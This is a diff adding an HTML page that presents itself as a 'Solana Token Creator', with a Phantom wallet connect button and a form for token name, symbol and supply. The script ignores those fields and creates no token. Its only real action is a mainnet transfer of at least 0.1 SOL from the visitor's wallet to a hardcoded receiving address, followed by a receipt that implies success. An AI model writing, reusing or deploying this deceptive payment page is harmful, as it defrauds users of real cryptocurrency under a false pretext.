@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Solana Token Creator</title>
+  <style>
+    /* Background animation */
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    body {
+      margin:0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align:center;
+      height:100vh;
+      overflow:hidden;
+      background: linear-gradient(45deg, #0f0f1f, #1a1a2e, #141b2d, #0f0f1f);
+      background-size: 400% 400%;
+      animation: gradientBG 20s ease infinite;
+      color: white;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+    }
+
+    h1 {
+      font-size:3rem;
+      margin-bottom:10px;
+      text-shadow: 0 0 15px #00ffa3, 0 0 30px #00ffa3;
+    }
+
+    h2 {
+      font-size:1.2rem;
+      color:#a0a0a0;
+      margin-bottom:40px;
+    }
+
+    button {
+      background: linear-gradient(90deg, #00ffa3, #00e6a0);
+      color: black;
+      font-size:1.2rem;
+      border:none;
+      padding:15px 50px;
+      border-radius:12px;
+      cursor:pointer;
+      transition:0.3s;
+      box-shadow:0 0 10px #00ffa3,0 0 20px #00e6a0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    button::before {
+      content:'';
+      position:absolute;
+      top:-50%; left:-50%;
+      width:200%; height:200%;
+      background: rgba(255,255,255,0.2);
+      transform: rotate(45deg) translateX(-100%);
+      transition: transform 0.5s;
+    }
+
+    button:hover::before { transform: rotate(45deg) translateX(100%); }
+    button:hover { transform: scale(1.05); box-shadow:0 0 20px #00ffa3,0 0 40px #00e6a0; }
+
+    #connectBtn { position:absolute; top:20px; right:20px; background:#ffcc00; box-shadow:0 0 10px #ffcc00; }
+
+    /* Popup form */
+    .popup {
+      display:none;
+      position:fixed; top:0; left:0; width:100%; height:100%;
+      background: rgba(0,0,0,0.85);
+      justify-content:center; align-items:center;
+    }
+
+    .popup-content {
+      background:#1a2030; padding:30px; border-radius:15px;
+      width:90%; max-width:420px; text-align:left;
+      box-shadow:0 0 20px #00ffa3;
+    }
+
+    input {
+      width:100%; margin:10px 0; padding:10px;
+      border-radius:8px; border:none; font-size:1rem;
+    }
+
+    #closeBtn {
+      background:red; color:white; padding:8px 12px;
+      border-radius:8px; border:none; cursor:pointer;
+    }
+
+    .small { font-size:0.85rem; opacity:0.8; }
+    .receipt { margin-top:12px; background:#0f1724; padding:12px; border-radius:8px; text-align:left; word-break:break-all; }
+
+    /* Floating particles */
+    .solParticle {
+      position:absolute;
+      width:12px; height:12px;
+      background: radial-gradient(circle, #00ffa3 0%, #00e6a0 70%);
+      border-radius:50%;
+      opacity:0.7;
+      pointer-events:none;
+      animation: floatParticle 15s linear infinite;
+    }
+
+    @keyframes floatParticle {
+      0% { transform: translateY(100vh) translateX(0) rotate(0deg);}
+      100% { transform: translateY(-50px) translateX(50px) rotate(360deg);}
+    }
+
+  </style>
+</head>
+<body>
+
+  <button id="connectBtn">Connect Wallet</button>
+  <h1>🚀 Solana Token Creator</h1>
+  <h2>Create your own token instantly on Solana</h2>
+  <button id="createBtn">Create Token</button>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h2>Create Your Token</h2>
+      <label>Token Name</label>
+      <input type="text" id="tokenName" placeholder="Example: DogeKing" />
+      <label>Symbol</label>
+      <input type="text" id="tokenSymbol" placeholder="Example: DKG" />
+      <label>Total Supply</label>
+      <input type="number" id="tokenSupply" placeholder="1000000" />
+      <label>Amount of SOL to send (min 0.1)</label>
+      <input type="number" id="solAmount" placeholder="0.1" step="0.01" />
+      <div style="margin-top:14px; display:flex; gap:10px;">
+        <button id="submitToken">Create & Send SOL</button>
+        <button id="closeBtn">Cancel</button>
+      </div>
+      <div id="status" class="small" style="margin-top:12px;"></div>
+      <div id="receiptContainer"></div>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/@solana/web3.js@1.83.0/lib/index.iife.min.js"></script>
+
+  <script>
+    const RECEIVING_WALLET = "9t8TLBTKwr3rC7jfSLTpbFnExkd9vadsj8e5FzV64ST2";
+    const MIN_SOL = 0.1;
+    const NETWORK = "mainnet-beta"; // change to "devnet" to test
+    const RPC_URL = NETWORK==="devnet"?"https://api.devnet.solana.com":"https://api.mainnet-beta.solana.com";
+    const EXPLORER_TX = sig=>`https://explorer.solana.com/tx/${sig}?cluster=${NETWORK}`;
+    const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;
+
+    const popup=document.getElementById("popup");
+    const createBtn=document.getElementById("createBtn");
+    const closeBtn=document.getElementById("closeBtn");
+    const submitBtn=document.getElementById("submitToken");
+    const connectBtn=document.getElementById("connectBtn");
+    const statusEl=document.getElementById("status");
+    const receiptContainer=document.getElementById("receiptContainer");
+    let connectedPublicKey=null;
+    function setStatus(msg){statusEl.textContent=msg||""}
+
+    connectBtn.addEventListener("click",async()=>{
+      if(!window.solana||!window.solana.isPhantom){if(confirm("Phantom not found. Install?")){window.open("https://phantom.app/","_blank")} return;}
+      const resp=await window.solana.connect();
+      connectedPublicKey=resp.publicKey.toString();
+      connectBtn.textContent="✅ Wallet Connected";
+      connectBtn.disabled=true;
+    });
+
+    createBtn.addEventListener("click",()=>{setStatus(""); receiptContainer.innerHTML=""; popup.style.display="flex";});
+    closeBtn.addEventListener("click",()=>popup.style.display="none");
+
+    submitBtn.addEventListener("click",async()=>{
+      setStatus(""); receiptContainer.innerHTML="";
+      const name=document.getElementById("tokenName").value.trim();
+      const symbol=document.getElementById("tokenSymbol").value.trim();
+      const supply=document.getElementById("tokenSupply").value.trim();
+      const solStr=document.getElementById("solAmount").value.trim();
+      if(!name||!symbol||!supply||!solStr){alert("Please fill all fields."); return;}
+      const amountSol=Number(solStr);
+      if(isNaN(amountSol)||amountSol<MIN_SOL){alert(`Amount must be ≥ ${MIN_SOL} SOL.`); return;}
+
+      try{
+        if(!window.solana||!window.solana.isPhantom){alert("Phantom not found."); return;}
+        if(!connectedPublicKey){const resp=await window.solana.connect(); connectedPublicKey=resp.publicKey.toString(); connectBtn.textContent="✅ Wallet Connected"; connectBtn.disabled=true;}
+
+        setStatus("Creating transaction...");
+        const connection=new Connection(RPC_URL);
+        const fromPubkey=window.solana.publicKey;
+        const toPubkey=new PublicKey(RECEIVING_WALLET);
+        const lamports=Math.round(amountSol*LAMPORTS_PER_SOL);
+        const tx=new Transaction().add(SystemProgram.transfer({fromPubkey,toPubkey,lamports}));
+        setStatus("Requesting signature...");
+        const signed=await window.solana.signAndSendTransaction(tx);
+        const signature=signed?.signature||signed;
+        receiptContainer.innerHTML=`<div class="receipt"><div style="font-weight:600;margin-bottom:8px;">Transaction Submitted</div><div>Signature:<div style="font-family:monospace;">${signature}</div></div><div style="margin-top:8px;"><a href="${EXPLORER_TX(signature)}" target="_blank" style="color:#9bdfff;">View on Solana Explorer</a></div></div>`;
+        setStatus("Done — transaction submitted.");
+      }catch(err){console.error(err); setStatus("Transaction failed."); alert("Transaction failed or canceled.");}
+    });
+
+    // Floating particles
+    function createParticles(num){
+      for(let i=0;i<num;i++){
+        const p=document.createElement("div");
+        p.className="solParticle";
+        p.style.left=Math.random()*window.innerWidth+"px";
+        p.style.animationDuration=5+Math.random()*10+"s";
+        p.style.width=8+Math.random()*16+"px";
+        p.style.height=p.style.width;
+        document.body.appendChild(p);
+      }
+    }
+    createParticles(40);
+  </script>
+
+</body>
+</html>
